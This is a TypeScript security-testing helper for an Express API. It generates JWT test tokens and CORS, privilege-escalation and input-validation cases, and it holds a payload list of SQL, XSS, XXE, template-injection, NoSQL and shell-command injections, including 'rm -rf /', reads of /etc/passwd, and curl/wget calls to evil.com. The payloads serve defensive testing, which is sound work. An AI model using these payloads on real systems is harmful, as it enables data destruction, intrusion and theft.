import jwt from 'jsonwebtoken';
import crypto from 'crypto';
import { Request } from 'express';

/**
 * Security Testing Utilities
 * Provides helper functions for security testing scenarios
 */

export interface TestUser {
  id: string;
  email: string;
  role: string;
}

export interface SecurityTestConfig {
  jwtSecret: string;
  adminUser: TestUser;
  regularUser: TestUser;
  guestUser: TestUser;
}

export class SecurityTestUtils {
  private static readonly DEFAULT_JWT_SECRET = 'test-super-secret-key-for-security-tests';

  /**
   * Default test users for different roles
   */
  static readonly USERS = {
    admin: { id: 'admin-123', email: 'admin@security-test.com', role: 'admin' },
    manager: { id: 'manager-123', email: 'manager@security-test.com', role: 'manager' },
    user: { id: 'user-123', email: 'user@security-test.com', role: 'user' },
    guest: { id: 'guest-123', email: 'guest@security-test.com', role: 'guest' }
  };

  /**
   * Common malicious payloads for security testing
   */
  static readonly MALICIOUS_PAYLOADS = {
    sql: [
      "'; DROP TABLE employees; --",
      "' OR '1'='1",
      "'; DELETE FROM users WHERE '1'='1'; --",
      "' UNION SELECT * FROM information_schema.tables --",
      "1; EXEC sp_msforeachtable 'DROP TABLE ?'",
      "' OR 1=1#",
      "admin'--",
      "admin'/*",
      "' OR 'x'='x",
      "'; SHUTDOWN; --",
      "'; WAITFOR DELAY '00:00:05'; --",
      "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; --",
      "' UNION SELECT username, password FROM users --",
      "' UNION SELECT table_name FROM information_schema.tables --"
    ],
    xss: [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<div onclick="alert(1)">Click me</div>',
      '<style>@import"javascript:alert(1)"</style>',
      '<link rel="stylesheet" href="javascript:alert(1)">',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      '<object data="javascript:alert(1)"></object>',
      '<embed src="javascript:alert(1)">',
      '<applet code="malicious.class">',
      '<form><button formaction="javascript:alert(1)">',
      '<input onfocus="alert(1)" autofocus>',
      '<select onfocus="alert(1)" autofocus>'
    ],
    injection: [
      '../../../etc/passwd',
      '../../../../windows/system32/config/sam',
      '../config/database.json',
      '${7*7}',
      '{{7*7}}',
      '#{7*7}',
      '<%=7*7%>',
      '<%= File.open("/etc/passwd").read %>',
      '${jndi:ldap://evil.com/x}',
      '{{constructor.constructor("alert(1)")()}}',
      '${__import__("os").system("id")}',
      '#{File.read("/etc/passwd")}',
      '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
      '${T(java.lang.Runtime).getRuntime().exec("id")}'
    ],
    command: [
      '; rm -rf /',
      '$(whoami)',
      '`cat /etc/passwd`',
      '&& netstat -an',
      '| cat /etc/hosts',
      '; cat /proc/version',
      '$(ping -c 1 google.com)',
      '`ls -la`',
      '; sleep 10',
      '&& curl http://evil.com',
      '| nc -l 8080',
      '; wget http://evil.com/malware'
    ],
    xxe: [
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">]><data>&xxe;</data>',
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><data></data>'
    ],
    ldap: [
      '*)(uid=*))(|(uid=*',
      '*)(&(password=*))',
      '*)(|(objectClass=*',
      '*))(objectClass=user))&(uid=*',
      '*)(|(cn=*))'
    ],
    nosql: [
      '{"$ne": null}',
      '{"$regex": ".*"}',
      '{"$where": "this.credits == this.debits"}',
      '{"$gt": ""}',
      '{"username": {"$ne": null}, "password": {"$ne": null}}',
      '{"$or": [{"username": "admin"}, {"username": "root"}]}',
      '{"username": {"$regex": "^admin"}}',
      '{"$where": "function(){return true}"}',
      '{"username": {"$exists": true}}',
      '{"password": {"$in": ["", "password", "123456"]}}'
    ]
  };

  /**
   * Generate a test JWT token for a user
   */
  static generateTestToken(user: TestUser, secret: string = this.DEFAULT_JWT_SECRET, options: any = {}): string {
    const defaultOptions = {
      expiresIn: '24h',
      issuer: 'security-test',
      audience: 'test-api'
    };

    return jwt.sign(
      {
        userId: user.id,
        email: user.email,
        role: user.role,
        ...options.claims
      },
      secret,
      { ...defaultOptions, ...options }
    );
  }

  /**
   * Generate an expired JWT token
   */
  static generateExpiredToken(user: TestUser, secret: string = this.DEFAULT_JWT_SECRET): string {
    return jwt.sign(
      {
        userId: user.id,
        email: user.email,
        role: user.role,
        exp: Math.floor(Date.now() / 1000) - 3600 // Expired 1 hour ago
      },
      secret
    );
  }

  /**
   * Generate a JWT token with invalid signature
   */
  static generateInvalidSignatureToken(user: TestUser): string {
    return jwt.sign(user, 'wrong-secret-key');
  }

  /**
   * Generate a malformed JWT token
   */
  static generateMalformedToken(): string {
    return 'malformed.jwt.token.here';
  }

  /**
   * Generate a JWT token with tampered payload
   */
  static generateTamperedToken(user: TestUser, secret: string = this.DEFAULT_JWT_SECRET): string {
    const validToken = this.generateTestToken(user, secret);
    // Tamper with the token by changing a character in the payload
    return validToken.slice(0, -5) + 'XXXXX';
  }

  /**
   * Create test payloads for various attack vectors
   */
  static createAttackPayloads(basePayload: any, field: string, attackType: keyof typeof SecurityTestUtils.MALICIOUS_PAYLOADS): any[] {
    const payloads = this.MALICIOUS_PAYLOADS[attackType];
    return payloads.map(payload => ({
      ...basePayload,
      [field]: payload
    }));
  }

  /**
   * Validate that a response doesn't contain malicious content
   */
  static validateResponseSafety(responseBody: any): boolean {
    const responseStr = JSON.stringify(responseBody);

    // Check for script tags
    if (responseStr.includes('<script>') || responseStr.includes('javascript:')) {
      return false;
    }

    // Check for SQL keywords in error messages
    const sqlKeywords = ['SELECT', 'DROP', 'DELETE', 'INSERT', 'UPDATE', 'UNION'];
    if (sqlKeywords.some(keyword => responseStr.toUpperCase().includes(keyword))) {
      return false;
    }

    // Check for system information leakage
    const sensitiveInfo = ['database', 'password', 'secret', 'token', 'key', 'stack', 'trace'];
    if (sensitiveInfo.some(info => responseStr.toLowerCase().includes(info))) {
      return false;
    }

    return true;
  }

  /**
   * Generate random test data that's safe for testing
   */
  static generateSafeTestData(): any {
    return {
      firstName: `Test${crypto.randomInt(1000, 9999)}`,
      lastName: `User${crypto.randomInt(1000, 9999)}`,
      email: `test${crypto.randomInt(1000, 9999)}@security-test.com`,
      position: 'Test Developer',
      departmentId: '123e4567-e89b-12d3-a456-426614174000',
      salary: crypto.randomInt(30000, 150000)
    };
  }

  /**
   * Create a batch of test requests for rate limiting tests
   */
  static createRateLimitTestRequests(requestFunction: () => Promise<any>, count: number): Promise<any>[] {
    return Array(count).fill(null).map(() => requestFunction());
  }

  /**
   * Measure response time for potential timing attacks
   */
  static async measureResponseTime(requestFunction: () => Promise<any>): Promise<{ response: any; duration: number }> {
    const startTime = Date.now();
    const response = await requestFunction();
    const duration = Date.now() - startTime;
    return { response, duration };
  }

  /**
   * Validate security headers in response
   */
  static validateSecurityHeaders(headers: any): { valid: boolean; missing: string[] } {
    const requiredHeaders = [
      'x-content-type-options',
      'x-frame-options',
      'x-xss-protection',
      'strict-transport-security'
    ];

    const missing = requiredHeaders.filter(header => !headers[header]);
    return {
      valid: missing.length === 0,
      missing
    };
  }

  /**
   * Generate test UUIDs for testing
   */
  static generateTestUUID(): string {
    return crypto.randomUUID();
  }

  /**
   * Generate invalid UUIDs for testing validation
   */
  static generateInvalidUUIDs(): string[] {
    return [
      'invalid-uuid',
      '123',
      '123e4567-e89b-12d3-a456',
      '123e4567-e89b-12d3-a456-42661417400g',
      'not-a-uuid-at-all',
      '00000000-0000-0000-0000-000000000000', // Null UUID
      'ffffffff-ffff-ffff-ffff-ffffffffffff', // Max UUID
      ''
    ];
  }

  /**
   * Create test data with boundary values
   */
  static createBoundaryTestData(): any[] {
    return [
      // Empty values
      { firstName: '', lastName: '', email: '', position: '', salary: 0 },
      // Minimum valid values
      { firstName: 'ab', lastName: 'cd', email: 'a@b.co', position: 'ef', salary: 1 },
      // Maximum valid values
      { firstName: 'a'.repeat(50), lastName: 'b'.repeat(50), email: 'test@example.com', position: 'c'.repeat(100), salary: 9999999 },
      // Over maximum values
      { firstName: 'a'.repeat(51), lastName: 'b'.repeat(51), email: 'test@example.com', position: 'c'.repeat(101), salary: 10000001 },
      // Null values
      { firstName: null, lastName: null, email: null, position: null, salary: null },
      // Undefined values
      { firstName: undefined, lastName: undefined, email: undefined, position: undefined, salary: undefined }
    ];
  }

  /**
   * Simulate different IP addresses for rate limiting tests
   */
  static generateTestIPs(count: number): string[] {
    return Array(count).fill(null).map((_, index) => `192.168.1.${index + 1}`);
  }

  /**
   * Create CORS test scenarios
   */
  static createCORSTestScenarios(): Array<{ origin: string; shouldAllow: boolean }> {
    return [
      // Allowed origins
      { origin: 'http://localhost:3000', shouldAllow: true },
      { origin: 'http://localhost:3001', shouldAllow: true },
      { origin: 'http://127.0.0.1:3001', shouldAllow: true },

      // Disallowed origins
      { origin: 'http://evil.com', shouldAllow: false },
      { origin: 'https://attacker.net', shouldAllow: false },
      { origin: 'http://localhost:3000.evil.com', shouldAllow: false },
      { origin: 'null', shouldAllow: false },
      { origin: 'http://localhost:8080', shouldAllow: false }
    ];
  }

  /**
   * Generate test cases for input validation
   */
  static generateInputValidationTests(): Array<{ input: any; expectValid: boolean; description: string }> {
    return [
      // Valid inputs
      { input: 'valid-name', expectValid: true, description: 'Valid string input' },
      { input: 'test@example.com', expectValid: true, description: 'Valid email' },
      { input: 50000, expectValid: true, description: 'Valid salary' },

      // Invalid inputs
      { input: '<script>alert("XSS")</script>', expectValid: false, description: 'XSS payload' },
      { input: "'; DROP TABLE users; --", expectValid: false, description: 'SQL injection' },
      { input: '../../../etc/passwd', expectValid: false, description: 'Path traversal' },
      { input: 'a'.repeat(1000), expectValid: false, description: 'Excessively long string' },
      { input: -1, expectValid: false, description: 'Negative number where positive expected' },
      { input: null, expectValid: false, description: 'Null value' },
      { input: undefined, expectValid: false, description: 'Undefined value' },
      { input: {}, expectValid: false, description: 'Object where string expected' },
      { input: [], expectValid: false, description: 'Array where string expected' }
    ];
  }

  /**
   * Create test scenarios for privilege escalation
   */
  static createPrivilegeEscalationTests(): Array<{ user: TestUser; action: string; expectAllowed: boolean }> {
    return [
      // Admin should access everything
      { user: this.USERS.admin, action: 'delete-user', expectAllowed: true },
      { user: this.USERS.admin, action: 'create-admin', expectAllowed: true },
      { user: this.USERS.admin, action: 'view-all-data', expectAllowed: true },

      // Manager should have limited access
      { user: this.USERS.manager, action: 'create-project', expectAllowed: true },
      { user: this.USERS.manager, action: 'delete-user', expectAllowed: false },
      { user: this.USERS.manager, action: 'create-admin', expectAllowed: false },

      // Regular user should have minimal access
      { user: this.USERS.user, action: 'view-own-data', expectAllowed: true },
      { user: this.USERS.user, action: 'create-project', expectAllowed: false },
      { user: this.USERS.user, action: 'delete-user', expectAllowed: false },
      { user: this.USERS.user, action: 'view-all-data', expectAllowed: false },

      // Guest should have very limited access
      { user: this.USERS.guest, action: 'view-public-data', expectAllowed: true },
      { user: this.USERS.guest, action: 'view-own-data', expectAllowed: false },
      { user: this.USERS.guest, action: 'create-project', expectAllowed: false }
    ];
  }

  /**
   * Cleanup test data and reset state
   */
  static async cleanup(): Promise<void> {
    // Reset environment variables
    process.env.NODE_ENV = 'test';
    process.env.JWT_SECRET = this.DEFAULT_JWT_SECRET;

    // Clear any test data from database if needed
    // This would depend on your database service implementation
  }

  /**
   * Generate comprehensive security test report
   */
  static generateSecurityTestReport(results: any[]): string {
    const passed = results.filter(r => r.passed).length;
    const failed = results.filter(r => !r.passed).length;
    const total = results.length;

    let report = `
🔐 Security Test Report
======================
Total Tests: ${total}
Passed: ${passed}
Failed: ${failed}
Success Rate: ${((passed / total) * 100).toFixed(2)}%

`;

    if (failed > 0) {
      report += '\n❌ Failed Tests:\n';
      results.filter(r => !r.passed).forEach(test => {
        report += `- ${test.name}: ${test.error}\n`;
      });
    }

    report += '\n✅ Security Recommendations:\n';
    report += '- Regular security audits\n';
    report += '- Keep dependencies updated\n';
    report += '- Implement proper logging and monitoring\n';
    report += '- Use HTTPS in production\n';
    report += '- Implement proper session management\n';
    report += '- Regular penetration testing\n';

    return report;
  }
}

/**
 * Security assertion helpers
 */
export class SecurityAssertions {
  /**
   * Assert that response doesn't contain XSS vulnerabilities
   */
  static assertNoXSS(responseBody: any): void {
    const responseStr = JSON.stringify(responseBody);
    expect(responseStr).not.toContain('<script>');
    expect(responseStr).not.toContain('javascript:');
    expect(responseStr).not.toContain('onerror=');
    expect(responseStr).not.toContain('onload=');
  }

  /**
   * Assert that response doesn't leak SQL information
   */
  static assertNoSQLLeakage(responseBody: any): void {
    const responseStr = JSON.stringify(responseBody).toLowerCase();
    expect(responseStr).not.toMatch(/\b(select|insert|update|delete|drop|create|alter|truncate)\b/);
  }

  /**
   * Assert that response has proper security headers
   */
  static assertSecurityHeaders(headers: any): void {
    expect(headers['x-content-type-options']).toBe('nosniff');
    expect(headers['x-frame-options']).toBeDefined();
    expect(headers['x-xss-protection']).toBeDefined();
  }

  /**
   * Assert that response time is within acceptable range (prevents timing attacks)
   */
  static assertResponseTime(duration: number, maxDuration: number = 5000): void {
    expect(duration).toBeLessThan(maxDuration);
  }

  /**
   * Assert that response doesn't contain sensitive information
   */
  static assertNoSensitiveData(responseBody: any): void {
    const responseStr = JSON.stringify(responseBody).toLowerCase();
    const sensitiveTerms = ['password', 'secret', 'token', 'key', 'api_key', 'private'];

    sensitiveTerms.forEach(term => {
      expect(responseStr).not.toContain(term);
    });
  }
}

export default SecurityTestUtils;